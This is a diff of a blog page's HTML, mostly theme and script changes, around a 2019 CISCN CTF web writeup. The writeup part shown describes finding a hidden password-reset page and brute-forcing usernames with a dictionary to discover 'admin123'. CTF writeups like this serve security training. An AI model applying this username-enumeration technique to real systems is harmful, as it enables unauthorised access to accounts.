@@ -1,52 +1,20 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>2019年CISCN(全国大学生信息安全竞赛)华南赛区wp | Sp4ce's Blog</title><meta name="description" content="题目是在Fix It环境拷下来的，写writeup时的环境是自己搭的 有些题目忘记拷贝数据库，各位大佬凑活看吧 题目的GitHub仓库：https:&#x2F;&#x2F;github.com&#x2F;NS-Sp4ce&#x2F;2019-Ciscn-Southern-China-Web    Web1Break It打开页面如下  按照惯例Ctrl+U看源代码，发现被注释的&lt;!--  &lt;p class&#x3D;&quot;f"><meta name="keywords" content="CTF,WriteUp"><meta name="author" content="Sp4ce"><meta name="copyright" content="Sp4ce"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="dns-prefetch" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="http://ta.qq.com"/><link rel="dns-prefetch" href="http://ta.qq.com"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="dns-prefetch" href="https://fonts.googleapis.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="dns-prefetch" href="//busuanzi.ibruce.info"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="2019年CISCN(全国大学生信息安全竞赛)华南赛区wp"><meta name="twitter:description" content="题目是在Fix It环境拷下来的，写writeup时的环境是自己搭的 有些题目忘记拷贝数据库，各位大佬凑活看吧 题目的GitHub仓库：https:&#x2F;&#x2F;github.com&#x2F;NS-Sp4ce&#x2F;2019-Ciscn-Southern-China-Web    Web1Break It打开页面如下  按照惯例Ctrl+U看源代码，发现被注释的&lt;!--  &lt;p class&#x3D;&quot;f"><meta name="twitter:image" content="https://0x20h.com/img/random/material-15.png"><meta property="og:type" content="article"><meta property="og:title" content="2019年CISCN(全国大学生信息安全竞赛)华南赛区wp"><meta property="og:url" content="https://0x20h.com/p/ece4.html"><meta property="og:site_name" content="Sp4ce's Blog"><meta property="og:description" content="题目是在Fix It环境拷下来的，写writeup时的环境是自己搭的 有些题目忘记拷贝数据库，各位大佬凑活看吧 题目的GitHub仓库：https:&#x2F;&#x2F;github.com&#x2F;NS-Sp4ce&#x2F;2019-Ciscn-Southern-China-Web    Web1Break It打开页面如下  按照惯例Ctrl+U看源代码，发现被注释的&lt;!--  &lt;p class&#x3D;&quot;f"><meta property="og:image" content="https://0x20h.com/img/random/material-15.png"><meta property="article:published_time" content="2019-08-10T13:11:33.000Z"><meta property="article:modified_time" content="2019-10-18T15:58:04.874Z"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>var autoChangeMode = '1'
-var t = Cookies.get("theme")
-if (autoChangeMode == '1'){
-  var isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
-  var isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
-  var isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
-  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
-
-  if (t === undefined){
-    if (isLightMode) activateLightMode()
-    else if (isDarkMode) activateDarkMode()
-    else if (isNotSpecified || hasNoSupport){
-      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
-      var now = new Date()
-      var hour = now.getHours()
-      var isNight = hour < 6 || hour >= 18
-      isNight ? activateDarkMode() : activateLightMode()
-  }
-  } else if (t == 'light') activateLightMode()
-  else activateDarkMode()
-
-} else if (autoChangeMode == '2'){
-  now = new Date();
-  hour = now.getHours();
-  isNight = hour < 6 || hour >= 18
-  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
-  else if (t === 'light') activateLightMode()
-  else activateDarkMode() 
-} else {
-  if ( t == 'dark' ) activateDarkMode()
-  else if ( t == 'light') activateLightMode()
-}
-
-function activateDarkMode(){
-  document.documentElement.setAttribute('data-theme', 'dark')
-  if (document.querySelector('meta[name="theme-color"]') !== null){
-    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
-  }
-}
-function activateLightMode(){
-  document.documentElement.setAttribute('data-theme', 'light')
-  if (document.querySelector('meta[name="theme-color"]') !== null){
-  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
-  }
-}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><link rel="canonical" href="https://0x20h.com/p/ece4.html"><link rel="prev" title="QQ客户端一处BUG" href="https://0x20h.com/p/7f02.html"><link rel="next" title="5W WordPress站点被shell事件调查报告" href="https://0x20h.com/p/bf2f.html"><script src="https://tajs.qq.com/stats?sId=66540600" charset="UTF-8"></script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>2019年CISCN(全国大学生信息安全竞赛)华南赛区wp | Sp4ce's Blog</title><meta name="description" content="题目是在Fix It环境拷下来的，写writeup时的环境是自己搭的 有些题目忘记拷贝数据库，各位大佬凑活看吧 题目的GitHub仓库：https:&#x2F;&#x2F;github.com&#x2F;NS-Sp4ce&#x2F;2019-Ciscn-Southern-China-Web    Web1Break It打开页面如下  按照惯例Ctrl+U看源代码，发现被注释的&lt;!--  &lt;p class&#x3D;&quot;f"><meta name="keywords" content="CTF,WriteUp"><meta name="author" content="Sp4ce"><meta name="copyright" content="Sp4ce"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://0x20h.com/p/ece4.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//pingjs.qq.com"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta property="og:type" content="article"><meta property="og:title" content="2019年CISCN(全国大学生信息安全竞赛)华南赛区wp"><meta property="og:url" content="https://0x20h.com/p/ece4.html"><meta property="og:site_name" content="Sp4ce's Blog"><meta property="og:description" content="题目是在Fix It环境拷下来的，写writeup时的环境是自己搭的 有些题目忘记拷贝数据库，各位大佬凑活看吧 题目的GitHub仓库：https:&#x2F;&#x2F;github.com&#x2F;NS-Sp4ce&#x2F;2019-Ciscn-Southern-China-Web    Web1Break It打开页面如下  按照惯例Ctrl+U看源代码，发现被注释的&lt;!--  &lt;p class&#x3D;&quot;f"><meta property="og:image" content="https://0x20h.com/img/random/material-12.png"><meta property="article:published_time" content="2019-08-10T13:11:33.000Z"><meta property="article:modified_time" content="2019-10-18T15:58:04.874Z"><meta name="twitter:card" content="summary"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><script>var _mtac = {};
+(function() {
+    var mta = document.createElement("script");
+    mta.src = "//pingjs.qq.com/h5/stats.js?v2.0.4";
+    mta.setAttribute("name", "MTAH5");
+    mta.setAttribute("sid", "66540600");
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(mta, s);
+})();
+</script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
   root: '/',
+  hexoversion: '4.2.0',
   algolia: undefined,
-  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
-  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://0x20h.com/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
   copy: {
     success: '复制成功',
     error: '复制错误',
@@ -56,34 +24,110 @@ function activateLightMode(){
     message_prev: '按',
     message_next: '键将本页加入书签'
   },
-  runtime_unit: '天',
-  runtime: true,
-  copyright: {"languages":{"author":"作者: Sp4ce","link":"链接: ","source":"来源: Sp4ce's Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
-  ClickShowText: {"text":"富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善","fontSize":"15px"},
+  runtime: '天',
+  date_suffix: {"one_hour":"刚刚","hours":"小时前","day":"天前"},
+  copyright: undefined,
+  ClickShowText: {"text":"I,LOVE,YOU,富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善","fontSize":"15px"},
   medium_zoom: false,
   fancybox: true,
   Snackbar: {"bookmark":{"message_prev":"按","message_next":"键将本页加入书签"},"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-center"},
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
   baiduPush: false,
-  highlightCopy: true,
-  highlightLang: true,
-  highlightShrink: 'false',
-  isFontAwesomeV5: false,
   isPhotoFigcaption: false,
   islazyload: true,
-  isanchor: false
-  
-}</script><script>var GLOBAL_CONFIG_SITE = { 
+  isanchor: true
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+    },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
   isPost: true,
   isHome: false,
-  isSidebar: true  
-  }</script><noscript><style>
-#page-header {
+  isHighlightShrink: false,
+  isSidebar: true,
+  postUpdate: '2019-10-18 23:58:04'
+}</script><noscript><style type="text/css">
+#nav {
   opacity: 1
 }
-.justified-gallery img{
+.justified-gallery img {
   opacity: 1
 }
-</style></noscript><meta name="generator" content="Hexo 4.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">65</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">36</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">22</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-user"></i><span> 关于我</span></a></div><div class="menus_item"><a class="site-page" href="/contact/"><i class="fa-fw fa fa-address-card"></i><span> 联系方式</span></a></div><div class="menus_item"><a class="site-page" href="https://cloud.0x20h.com/" target="_blank" rel="noopener"><i class="fa-fw fa fa-cloud-download"></i><span> 共享网盘</span></a></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web1"><span class="toc-number">1.</span> <span class="toc-text">Web1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Break-It"><span class="toc-number">1.1.</span> <span class="toc-text">Break It</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fix-it"><span class="toc-number">1.2.</span> <span class="toc-text">Fix it</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web7"><span class="toc-number">2.</span> <span class="toc-text">web7</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Break-it"><span class="toc-number">2.1.</span> <span class="toc-text">Break it</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fix-it-1"><span class="toc-number">2.2.</span> <span class="toc-text">Fix it</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web10"><span class="toc-number">3.</span> <span class="toc-text">web10</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Break-it-1"><span class="toc-number">3.1.</span> <span class="toc-text">Break it</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fix-it-2"><span class="toc-number">3.2.</span> <span class="toc-text">Fix it</span></a></li></ol></li></ol></div></div></div><div id="body-wrap"><div class="post-bg" id="nav" style="background-image: url(/img/random/material-15.png)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">Sp4ce's Blog</a></span><span class="pull_right menus"><div id="search_button"><a class="site-page social-icon search"><i class="fa fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-user"></i><span> 关于我</span></a></div><div class="menus_item"><a class="site-page" href="/contact/"><i class="fa-fw fa fa-address-card"></i><span> 联系方式</span></a></div><div class="menus_item"><a class="site-page" href="https://cloud.0x20h.com/" target="_blank" rel="noopener"><i class="fa-fw fa fa-cloud-download"></i><span> 共享网盘</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="post-info"><div id="post-title"><div class="posttitle">2019年CISCN(全国大学生信息安全竞赛)华南赛区wp</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2019-08-10 21:11:33"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2019-08-10</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2019-10-18 23:58:04"><i class="fa fa-history" aria-hidden="true"></i> 更新于 2019-10-18</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"> <span class="post-meta-wordcount"><i class="post-meta__icon fa fa-file-word-o" aria-hidden="true"></i><span>字数总计:</span><span class="word-count">1.6k</span><span class="post-meta__separator">|</span><i class="post-meta__icon fa fa-clock-o" aria-hidden="true"></i><span>阅读时长: 6 分钟</span></span></div><div class="meta-thirdline"><span class="post-meta-pv-cv"><span class="post-meta__separator">|</span><i class="fa fa-eye post-meta__icon" aria-hidden="true"> </i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"><span class="post-meta__separator">|</span><i class="post-meta__icon fa fa-comment-o" aria-hidden="true"></i><span>评论数:</span><a href="/p/ece4.html#post-comment" itemprop="discussionUrl"><span class="valine-comment-count comment-count" data-xid="/p/ece4.html" itemprop="commentCount"></span></a></span></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><blockquote>
+</style></noscript><script>var activateDarkMode = function () {
+  document.documentElement.setAttribute('data-theme', 'dark')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+  }
+}
+var activateLightMode = function () {
+  document.documentElement.setAttribute('data-theme', 'light')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+  }
+}
+
+var autoChangeMode = '1'
+var t = saveToLocal.get('theme')
+if (autoChangeMode === '1') {
+  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+  if (t === undefined) {
+    if (isLightMode) activateLightMode()
+    else if (isDarkMode) activateDarkMode()
+    else if (isNotSpecified || hasNoSupport) {
+      var now = new Date()
+      var hour = now.getHours()
+      var isNight = hour <= 6 || hour >= 18
+      isNight ? activateDarkMode() : activateLightMode()
+    }
+    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+      if (saveToLocal.get('theme') === undefined) {
+        e.matches ? activateDarkMode() : activateLightMode()
+      }
+    })
+  } else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else if (autoChangeMode === '2') {
+  now = new Date()
+  hour = now.getHours()
+  isNight = hour <= 6 || hour >= 18
+  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+  else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else {
+  if (t === 'dark') activateDarkMode()
+  else if (t === 'light') activateLightMode()
+}</script><meta name="generator" content="Hexo 4.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" data-lazy-src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">65</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">36</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">22</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-user"></i><span> 关于我</span></a></div><div class="menus_item"><a class="site-page" href="/contact/"><i class="fa-fw fa fa-address-card"></i><span> 联系方式</span></a></div></div></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web1"><span class="toc-number">1.</span> <span class="toc-text">Web1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Break-It"><span class="toc-number">1.1.</span> <span class="toc-text">Break It</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fix-it"><span class="toc-number">1.2.</span> <span class="toc-text">Fix it</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web7"><span class="toc-number">2.</span> <span class="toc-text">web7</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Break-it"><span class="toc-number">2.1.</span> <span class="toc-text">Break it</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fix-it-1"><span class="toc-number">2.2.</span> <span class="toc-text">Fix it</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web10"><span class="toc-number">3.</span> <span class="toc-text">web10</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Break-it-1"><span class="toc-number">3.1.</span> <span class="toc-text">Break it</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fix-it-2"><span class="toc-number">3.2.</span> <span class="toc-text">Fix it</span></a></li></ol></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(/img/random/material-12.png)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Sp4ce's Blog</a></span><span id="menus"><div id="search_button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-user"></i><span> 关于我</span></a></div><div class="menus_item"><a class="site-page" href="/contact/"><i class="fa-fw fa fa-address-card"></i><span> 联系方式</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">2019年CISCN(全国大学生信息安全竞赛)华南赛区wp</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-08-10T13:11:33.000Z" title="发表于 2019-08-10 21:11:33">2019-08-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2019-10-18T15:58:04.874Z" title="更新于 2019-10-18 23:58:04">2019-10-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><blockquote>
 <ol>
 <li>题目是在Fix It环境拷下来的，写<code>writeup</code>时的环境是自己搭的</li>
 <li>有些题目忘记拷贝数据库，各位大佬凑活看吧</li>
@@ -92,47 +136,47 @@ function activateLightMode(){
 </blockquote>
 <a id="more"></a>
 <h1 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h1><h2 id="Break-It"><a href="#Break-It" class="headerlink" title="Break It"></a>Break It</h2><p>打开页面如下</p>
-<p><img src= /img/loading.gif data-src="/images/1562850051215.png" alt="1562850051215"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1562850051215.png" alt="1562850051215"></p>
 <p>按照惯例<code>Ctrl+U</code>看源代码，发现被注释的<code>&lt;!--  &lt;p class=&quot;forgot&quot;&gt;&lt;a id=&quot;iforget&quot; href=&quot;forgetpassword.php&quot;&gt;Forgot your password?&lt;/a&gt;&lt;/p&gt;--&gt;</code></p>
-<p><img src= /img/loading.gif data-src="/images/1562850150394.png" alt="1562850150394"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1562850150394.png" alt="1562850150394"></p>
 <p>字面意思是重置密码的页面，访问试试</p>
-<p><img src= /img/loading.gif data-src="/images/1562850199817.png" alt="1562850199817"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1562850199817.png" alt="1562850199817"></p>
 <p>由于不知道用户名，抓包随便输入个用户名看看返回的信息</p>
-<p><img src= /img/loading.gif data-src="/images/1562850323023.png" alt="1562850323023"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1562850323023.png" alt="1562850323023"></p>
 <p>OK，找个用户名字典爆破下</p>
-<p><img src= /img/loading.gif data-src="/images/1562850802531.png" alt="1562850802531"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1562850802531.png" alt="1562850802531"></p>
 <p>设置下</p>
-<p><img src= /img/loading.gif data-src="/images/1562850369376.png" alt="1562850369376"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1562850369376.png" alt="1562850369376"></p>
 <p>爆破出<code>admin123</code>这个用户存在</p>
-<p><img src= /img/loading.gif data-src="/images/1562850867761.png" alt="1562850867761"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1562850867761.png" alt="1562850867761"></p>
 <p>输入后，跳转到下一个页面</p>
